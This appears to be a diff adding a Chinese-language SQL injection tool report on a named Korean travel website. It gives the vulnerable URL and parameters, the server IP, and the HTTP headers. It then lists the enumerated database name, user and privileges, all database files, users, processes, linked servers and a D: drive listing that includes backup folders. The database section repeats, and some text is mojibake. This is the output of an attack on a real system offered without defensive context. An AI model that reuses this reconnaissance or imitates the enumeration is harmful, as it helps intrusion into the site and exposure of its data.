@@ -1,0 +1,181 @@
+■漏洞信息:============================================================
+ ·URL:http://newreview.nomad21.com/default.asp?score=0&cnt=0&insPage=over&mode=nView&pid=480&tableName=place&category=A07&city_code=TPE
+ ·页面标题：⑵⑵⑵ 咯青磊啊 父靛绰 咯青府轰固叼绢 - [措父] 固扼付浚磐抛牢刚飘颇农 (鸥捞其捞) ⑵⑵⑵
+ ·参数:score=0&cnt=0&insPage=over&mode=nView&pid=480&tableName=place&category=A07&city_code=TPE
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:221.143.50.136
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 11:29:55 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+P3P: CP='CAO PSA CONi OTR OUR DEM ONL'
+pragma: no-cache
+Content-Length: 105771
+Content-Type: text/html
+Expires: Sun, 03 Apr 2011 11:28:55 GMT
+Set-Cookie: ViewURL=%5B%B4%EB%B8%B8%5D+%B9%CC%B6%F3%B8%B6%BF%A3%C5%CD%C5%D7%C0%CE%B8%D5%C6%AE%C6%C4%C5%A9%7Cdefault%2Easp%3FinsPage%3Dover%26mode%3DnView%26pid%3D480%26tableName%3Dplace%26category%3DA07%26city%5Fcode%3DTAI%26score%3D0%26kname%3D%5B%B4%EB%B8%B8%5D+%B9%CC%B6%F3%B8%B6%BF%A3%C5%CD%C5%D7%C0%CE%B8%D5%C6%AE%C6%C4%C5%A9%26cnt%3D6%7Cplace%7C480; path=/
+Set-Cookie: ASPSESSIONIDCABRTQAA=OAHPIDDDKHCACABACIICMMNB; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：tourmall
+- 用户名：nomadtour
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NOMAD21-COM
+- 服务名：MSSQLSERVER
+- 系统用户名：nomadtour
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+21segi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\21segi_Data.MDF	
+bbs	C:\Program Files\Microsoft SQL Server\MSSQL\Data\bbs_Data.MDF	
+EuroPension	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EuroPension_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+ndb_Travel_Inside	C:\Program Files\Microsoft SQL Server\MSSQL\data\ndb_Travel_Inside_Data.MDF	
+Nomad_mail	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Nomad_mail.mdf	
+nomadAD	C:\Program Files\Microsoft SQL Server\MSSQL\data\nomadAD_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+shopping	C:\Program Files\Microsoft SQL Server\MSSQL\Data\shopping_Data.MDF	
+singapore	C:\Program Files\Microsoft SQL Server\MSSQL\Data\singapore_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+tourbbs	C:\Program Files\Microsoft SQL Server\MSSQL\Data\tourbbs_Data.MDF	
+tourmall	C:\Program Files\Microsoft SQL Server\MSSQL\Data\tourmall_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	NOMAD21-COM	2920	AWAITING COMMAND	SQL_START	
+SQLAgent - Alert Engine	sleeping	NOMAD21-COM	2920	AWAITING COMMAND	SQL_START	
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2588	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2588	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2588	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+NOMAD21-COM	SQL Server	SQLOLEDB	NOMAD21-COM		NOMAD21-COM	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+归诀磊丰\
+阂鞘夸磊丰\
+捞傈官帕拳搁\
+AQTRONIX WebKnight\
+DB_Backup\
+IIsLog\
+Mail_Backup\
+RECYCLER\
+System Volume Information\
+www\
+皋老拌沥 巩辑.txt
+SQL.txt
+
+
+■数据库信息:============================================================
+- 数据库名：tourmall
+- 用户名：nomadtour
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NOMAD21-COM
+- 服务名：MSSQLSERVER
+- 系统用户名：nomadtour
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+21segi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\21segi_Data.MDF	
+bbs	C:\Program Files\Microsoft SQL Server\MSSQL\Data\bbs_Data.MDF	
+EuroPension	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EuroPension_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+ndb_Travel_Inside	C:\Program Files\Microsoft SQL Server\MSSQL\data\ndb_Travel_Inside_Data.MDF	
+Nomad_mail	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Nomad_mail.mdf	
+nomadAD	C:\Program Files\Microsoft SQL Server\MSSQL\data\nomadAD_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+shopping	C:\Program Files\Microsoft SQL Server\MSSQL\Data\shopping_Data.MDF	
+singapore	C:\Program Files\Microsoft SQL Server\MSSQL\Data\singapore_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+tourbbs	C:\Program Files\Microsoft SQL Server\MSSQL\Data\tourbbs_Data.MDF	
+tourmall	C:\Program Files\Microsoft SQL Server\MSSQL\Data\tourmall_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	NOMAD21-COM	2900	AWAITING COMMAND	SQL_START	
+SQLAgent - Alert Engine	sleeping	NOMAD21-COM	2900	AWAITING COMMAND	SQL_START	
+MS SQLEM	sleeping	NOMAD21-COM	4456	AWAITING COMMAND	Administrator	
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2692	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2692	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+NOMAD21-COM	SQL Server	SQLOLEDB	NOMAD21-COM		NOMAD21-COM	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
